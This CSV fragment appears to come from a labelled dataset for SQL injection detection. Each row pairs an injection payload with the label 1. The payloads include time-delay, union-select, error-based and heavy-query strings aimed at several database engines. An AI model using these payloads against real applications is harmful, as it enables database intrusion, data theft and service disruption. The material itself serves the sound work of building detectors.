row_index,payload_norm,label,sqli_type_hint
5490,1' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( 'cbnc' like 'cbnc,1,
5491,"1' ) as vlwh where 9403 = 9403 or elt ( 5873 = 5873,sleep ( 5 ) ) #",1,
5492,"1%"" ) union all select null,null#",1,
5493,"-4462%"" ) or 8571 = 8571--",1,
5494,"1' ) ) ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( ( ( 'skdy' = 'skdy",1,
5495,1' ) ) ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ( ( 'ljhc' = 'ljhc,1,
5496,select ( case when ( 4341 = 7041 ) then 4341 else 4341* ( select 4341 from mysql.db ) end ) #,1,
5497,"-2625' ) or elt ( 1032 = 1032,3623 ) and ( 'eliy' = 'eliy",1,
5498,"waitfor delay '0:0:5' and ""lhcv"" = ""lhcv",1,
5499,"1"" ) where 2278 = 2278",1,
5500,"1 ) ) ) union all select null,null#",1,
5501,"1 and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) # hlrg",1,
5502,"select * from generate_series ( 9167,9167,case when ( 9167 = 2273 ) then 1 else 0 end ) limit 1--",1,
5503,-2527 ) ) as oqpy where 7468 = 7468 or 3038 = 3038,1,
5504,1%' waitfor delay '0:0:5'--,1,
5505,"1' where 7080 = 7080 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",1,
5506,"1'+ ( select 'mikf' where 5814 = 5814 or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,
5507,"1 ) ) as rsnb where 3168 = 3168 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",1,
5508,"1"" where 5039 = 5039 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,
5509,1' ) where 9516 = 9516,1,
5510,"-9871"" ) union all select 9082#",1,
5511,1'|| ( select 'adni' from dual where 6611 = 6611,1,
5512,1 ) ) as wajy where 8593 = 8593,1,
5513,-8404 ) ) order by 1--,1,
5514,"-2759%"" ) ) or 7769 = 1249#",1,
5515,"( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )",1,
5516,"1 ) as nkjo where 8462 = 8462 union all select null,null,null,null,null,null,null,null,null--",1,
5517,"1' where 1628 = 1628 and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,
5518,"-4822"" or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ""owbp"" = ""owbp",1,
5519,1' ) where 2974 = 2974 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --,1,
